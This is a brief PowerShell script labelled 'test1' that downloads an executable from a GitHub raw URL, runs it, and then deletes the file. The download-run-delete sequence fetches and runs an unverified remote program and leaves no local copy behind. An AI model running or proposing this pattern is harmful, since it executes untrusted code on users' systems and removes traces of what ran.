# test1 #
Invoke-WebRequest 'https://raw.githubusercontent.com/RavenCraftInitaitives/DomAndDarlene/main/client.exe' -OutFile client.exe
Start-Process '.\client.exe' -Wait
Remove-Item .\client.exe
